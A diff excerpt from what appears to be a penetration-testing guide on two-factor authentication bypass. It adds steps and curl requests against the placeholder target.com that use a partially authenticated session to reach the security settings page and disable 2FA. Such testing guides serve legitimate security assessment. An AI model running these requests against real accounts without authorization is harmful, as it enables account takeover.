@@ -42,6 +42,13 @@ chains_with: [rate-limiting, session-management, password-reset]
    curl -s -i https://target.com/dashboard -b "session=$PARTIAL_SESSION"
    curl -s -i -X POST https://target.com/api/auth/2fa/skip -b "session=$PARTIAL_SESSION"
    ```
+   Also check whether the partial session can reach the **2FA settings page itself** — if so,
+   the attacker can simply disable 2FA from within the half-authenticated state, then reload
+   the login flow fully authenticated:
+   ```bash
+   curl -s -i https://target.com/settings/security -b "session=$PARTIAL_SESSION"
+   curl -s -i -X POST https://target.com/api/settings/2fa/disable -b "session=$PARTIAL_SESSION"
+   ```
 
 3. **Response manipulation.** If the 2FA check's result is evaluated client-side (SPA reads a JSON field like `{"2fa_required": true}` and decides whether to show the OTP screen), intercept the login response and flip the field before it reaches the client JS:
    ```bash
